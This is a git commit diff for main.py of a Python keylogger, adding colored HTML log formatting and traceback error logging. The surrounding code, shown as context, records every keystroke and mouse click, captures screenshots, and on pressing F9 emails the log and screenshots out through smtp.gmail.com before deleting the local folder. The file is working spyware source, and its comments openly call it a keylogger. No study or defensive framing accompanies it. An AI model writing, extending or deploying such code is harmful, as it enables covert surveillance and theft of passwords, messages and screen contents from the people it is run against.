60210492a88a0e96aa4abb48425e34c1276f6a2d
Trọng Đại Nguyễn <brfox2k6@gmail.com>
2024-03-30 21:26:00 +0700

    20240330
    - print errors in log file
    - add colors

--- main.py
+++ main.py
@@ -2,7 +2,7 @@
 # 22 February 2024
 
 # Site-packages
-import cv2, dxcam
+import cv2, dxcam, traceback
 from pynput.keyboard import Listener as Keyboard_listener, Key
 from pynput.mouse import Listener as Mouse_listener, Button
 
@@ -16,6 +16,8 @@ from shutil import rmtree
 from smtplib import SMTP
 from ssl import create_default_context
 
+def add_color(s, color):
+  return f"<font color=\"{color}\">{s}</font>"
 
 def get_time(day=False) -> str:
   """
@@ -24,6 +26,9 @@ def get_time(day=False) -> str:
   format_ = "%d %b %H:%M:%S" if day else "%H:%M:%S"
   return datetime.now().strftime(format_)
 
+def print_traceback():
+  s = "<br>===== ERROR OCCURRED =====<br>" + traceback.format_exc() + "<br>==========<br>"
+  log_f.write(add_color(s, "red"))
 
 def get_screenshot() -> None:
   try:
@@ -31,11 +36,9 @@ def get_screenshot() -> None:
     img = cam.grab()
     img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
     cv2.imwrite(f"./s_manifest/s{idx}.jpg", img)
-    log_f.write(f"「s{idx}」 ")
-  except Exception as err:
-    log_f.write("\n===== ERROR in get_screenshot() =====\n")
-    log_f.write(err)
-    log_f.write("\n==========\n")
+    log_f.write(add_color(f"「s{idx}」 ", "blue"))
+  except:
+    print_traceback()
 
 
 def keyboard_press(key: Key) -> None:
@@ -51,7 +54,7 @@ def keyboard_press(key: Key) -> None:
     # Check if it's a combination key - goes with Ctrl
     try:
       key = SPE_CTRL[str(key).replace("'", "")]
-      key = f"「{key}」"
+      key = add_color(key, "green")
 
     # This can cause ValueError (if it's not a combination key)
     except KeyError:
@@ -62,23 +65,23 @@ def keyboard_press(key: Key) -> None:
 
     # Press F9 -> send mail AND terminate
     if key == Key.f9:
-      log_f.write(f"\n\n「Keylogger terminated {get_time(day=True)}」 ")
+      log_f.write(add_color(f"<br><br>「Keylogger terminated {get_time(day=True)}」 ", "blue"))
       exit_ = True
       send_mail()
       return False
 
     # Enter -> create new line in log file + get time
     elif key == Key.enter:
-      key = f"\n「••   {get_time(day=True)}」"
+      key = add_color(f"<br>「••   {get_time(day=True)}」", "blue")
       get_screenshot()
 
     # For aesthetic
     elif key == Key.backspace:
-      key = "「«×」"
+      key = add_color("「«×」", "green")
     elif key == Key.delete:
-      key = "「×»」"
+      key = add_color("「×»」", "green")
     elif key == Key.space:
-      key = "「_」"
+      key = add_color("「_」", "green")
 
     else:
         # For aesthetic
@@ -86,7 +89,8 @@ def keyboard_press(key: Key) -> None:
             .replace("_l", "").replace("_r", "").replace("_gr", "")
       if key == "shift":
         key = "↑"
-      key = f"「{key}」"
+      # key = f"「{key}」"
+      key = add_color(f"「{key}」", "green")
 
   log_f.write(key)
 
@@ -106,7 +110,7 @@ def mouse_click(x, y, button, pressed):
   else:
     button = 'M'
   # :>4d: Right aligned text with width=4
-  log_f.write(f"\n「{x :>4d} {y :>4d} {button} {get_time()}」 ")
+  log_f.write(add_color(f"<br>「{x :>4d} {y :>4d} {button} {get_time()}」 ", "blue"))
 
 
 def send_mail() -> None:
@@ -123,9 +127,8 @@ def send_mail() -> None:
 
     print("Reading log file")
     log_f.seek(0)
-    body = log_f.read().strip()
-    body = body.replace("\n", "<br>").replace(" ", "&nbsp;")
-    body = f'<font size="4" face="Cascadia Mono">{body}</font>'
+    body = log_f.read()
+    body = f'<font size="4" face="Trebuchet MS">{body}</font>'
 
     print("Initializing message")
     message = MIMEMultipart()
@@ -152,9 +155,8 @@ def send_mail() -> None:
     log_f.close()
     rmtree("./s_manifest", ignore_errors=True)
 
-  except Exception as err:
-    print("Failed to sent email")
-    print(err)
+  except:
+    print_traceback()
 
 
 if __name__ == "__main__":
@@ -168,7 +170,7 @@ if __name__ == "__main__":
   exit_ = False
   cam = dxcam.create()
   log_f = open("./s_manifest/log.txt", mode="a+", encoding="utf-8")
-  log_f.write(f"\n\n「Keylogger started {get_time(day=True)}」\n")
+  log_f.write(add_color(f"<br><br>「Keylogger started {get_time(day=True)}」<br>", "blue"))
 
   # TODO: Edit this before using
   SMTP_HOST = "smtp.gmail.com"
